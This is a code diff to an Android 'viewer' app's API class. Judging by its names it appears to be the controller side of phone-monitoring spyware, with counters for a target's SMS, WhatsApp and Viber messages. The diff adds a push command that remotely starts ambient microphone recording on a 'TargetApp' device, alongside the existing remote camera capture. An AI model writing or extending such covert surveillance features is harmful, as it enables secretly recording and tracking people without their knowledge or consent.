@@ -62,6 +62,8 @@ import static com.scp.viewer.API.Global.SMS_TOTAL;
 import static com.scp.viewer.API.Global.SMS_VIBER_TYPE;
 import static com.scp.viewer.API.Global.SMS_WHATSAPP_TYPE;
 import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
+import static com.scp.viewer.API.Global.TYPE_START_AMBIENT_RECORDING;
+import static com.scp.viewer.API.Global.TYPE_TAKE_A_PICTURE;
 import static com.scp.viewer.API.Global.VIBER_TOTAL;
 import static com.scp.viewer.API.Global.WHATSAPP_TOTAL;
 import static com.scp.viewer.Database.Entity.AmbientRecordEntity.COLUMN_CREATED_DATE_AMBIENTRECORD;
@@ -628,14 +630,20 @@ public class APIMethod {
     /**
      * PostPushNotificationToServer This is the common method for push notification protocols from ViewerApp to TargetApp.
      */
-    public static String PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int use_Camera)
+    public static String PostPushNotificationToServer(String device_ID, String device_Row_ID, String type, int actions)
     {
         String value;
-        if(use_Camera != 0)
+        if(type.equals(TYPE_TAKE_A_PICTURE))
         {
-            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Use_Camera=\"" + use_Camera + "\"></RequestParams>";
+            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Use_Camera=\"" + actions + "\"></RequestParams>";
         }
-        else {
+        else if(type.equals(TYPE_START_AMBIENT_RECORDING))
+        {
+            //Start_Ambient="0"
+            value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+ device_Row_ID +"\" Type=\"" +type + "\"  Start_Ambient=\"" + actions + "\"></RequestParams>";
+        }
+        else
+        {
             value = "<RequestParams Device_ID=\""+ device_ID +"\" Device_Row_ID=\""+device_Row_ID +"\" Type=\"" + type + "\"></RequestParams>";
         }
 
@@ -764,6 +772,7 @@ public class APIMethod {
 
         @Override
         protected void onPostExecute(String s) {
+
             APIURL.deviceObject(s);
             Log.d("PushNotification", APIURL.bodyLogin.getDescription() + "==" + "" + APIURL.bodyLogin.getResultId() + "" + APIURL.bodyLogin.getIsSuccess());
             if (APIURL.bodyLogin.getIsSuccess().equals("1") && APIURL.bodyLogin.getResultId().equals("1")) {
